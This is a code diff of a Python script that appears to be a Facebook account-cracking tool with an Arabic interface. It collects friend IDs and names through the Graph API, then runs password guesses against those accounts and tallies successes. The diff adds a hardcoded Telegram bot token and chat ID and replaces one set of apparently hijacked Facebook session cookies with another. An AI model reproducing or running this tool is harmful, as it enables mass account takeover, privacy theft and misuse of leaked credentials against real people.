@@ -6,7 +6,8 @@ except ModuleNotFoundError as x:
 	m = str(x).split("'")[1]
 	os.system(f'pip install {m}')
 from concurrent.futures import ThreadPoolExecutor as kil
-
+ID1 = '5705562178'
+token1 = '6930238082:AAG9y2qDEv7y04PoRzhLSm9BPkbyxT7__Kc'
 Id,token = input('\033[2;36mID : \033[1;97m'),input('\033[2;36mToken : \033[1;97m')
 kopo = requests.get('https://api.telegram.org/bot' + str(token) + '/sendMessage?chat_id=' + str(Id) + '&text=' + str('- تم تشغيل الاداة '))
 webbrowser.open('t.me/@M_O_L_B')
@@ -34,7 +35,7 @@ z,total,ok,cp=0,0,0,0
 
 def get(user):
 	try:
-		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAABwzLixnjYBO8aDgnZCXTXnwv91swARorjXxPtRfKOrqGejLbbgd6SXDN5RzrysOqQavJjCIrvPZB0FFCMJdZCJHUec6ZA8e7qQhLFodPKlJr9CXwb8MHZCzISXi4od26Ky1HNk6P1CpOBX6vgNY16JZB7CpfcEdoYDRTgmdZCWWWvhLdy53eCoZBuBtQBhUbQw3jgZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=QeryZtw_-Y0-ed0FCVIZJoHC; sb=QeryZil4s3GV7mUa9s-6Il74; m_pixel_ratio=2.75; wd=377x640; c_user=100080729619840; fr=0WRCUnSwqtUWO7Zei.AWXkoBqn9o8rgNkDAub1xm1MY2I.Bm8upB..AAA.0.0.Bm8upz.AWWvZNMIXVg; xs=26%3ACiInOG0VTnMuNg%3A2%3A1727195763%3A-1%3A6637; locale=ar_AR; fbl_st=101227373%3BT%3A28786596; wl_cbv=v2%3Bclient_version%3A2629%3Btimestamp%3A1727195771; vpd=v1%3B640x377x2.75'}).json()
+		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAABwzLixnjYBO8aDgnZCXTXnwv91swARorjXxPtRfKOrqGejLbbgd6SXDN5RzrysOqQavJjCIrvPZB0FFCMJdZCJHUec6ZA8e7qQhLFodPKlJr9CXwb8MHZCzISXi4od26Ky1HNk6P1CpOBX6vgNY16JZB7CpfcEdoYDRTgmdZCWWWvhLdy53eCoZBuBtQBhUbQw3jgZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=Ze3yZpD7LoS8YI4i0_iokiXR; sb=Ze3yZv_3vXxjWNgHQR_M1LDi; m_pixel_ratio=2.75; ps_l=1; ps_n=1; wd=377x640; c_user=100025236272028; fr=0LZUN47oRAPIAXL5s.AWXKbLxUbnbaM3R7tBYVkuVa5xo.Bm8u1l..AAA.0.0.Bm8u19.AWUyb0NWuQc; xs=49%3ArAjC0IU1n0UGqg%3A2%3A1727196542%3A-1%3A6642; locale=ar_AR; fbl_st=101228622%3BT%3A28786609; vpd=v1%3B640x377x2.75'}).json()
 		for mm in url['friends']['data']:
 			ko = (mm['id']+'|'+mm['name'])
 			if ko in fid:
@@ -78,7 +79,7 @@ def password():
 
 def checker(idf,pwv):
 	global total,ok,cp
-	print('\r\033[2;36mϟ \033[1;97m[\033[2;36m🇪🇬المصري\033[1;97m_\033[2;36mاسير\033[2;32m] \033[1;97m~ \033[1;97m[\033[2;32mOK \033[1;97m- \033[1;31mCP\033[1;97m] = [\033[2;32m%s\033[1;97m -\033[1;31m %s\033[1;97m] = [\033[1;33m %s/%s\033[1;97m ]'%(ok,cp,total,len(fid)),end=' ');sys.stdout.flush()
+	print('\r\033[2;36mϟ \033[1;97m[\033[2;36m🇪🇬 المصري\033[1;97m \033[2;36mاسير\033[2;32m] \033[1;97m~ \033[1;97m[\033[2;32mOK \033[1;97m- \033[1;31mCP\033[1;97m] = [\033[2;32m%s\033[1;97m -\033[1;31m %s\033[1;97m] = [\033[1;33m %s/%s\033[1;97m ]'%(ok,cp,total,len(fid)),end=' ');sys.stdout.flush()
 	for ps in pwv:
 		open('tt.txt','a').write(idf+'|'+ps+'\n')
 		try:
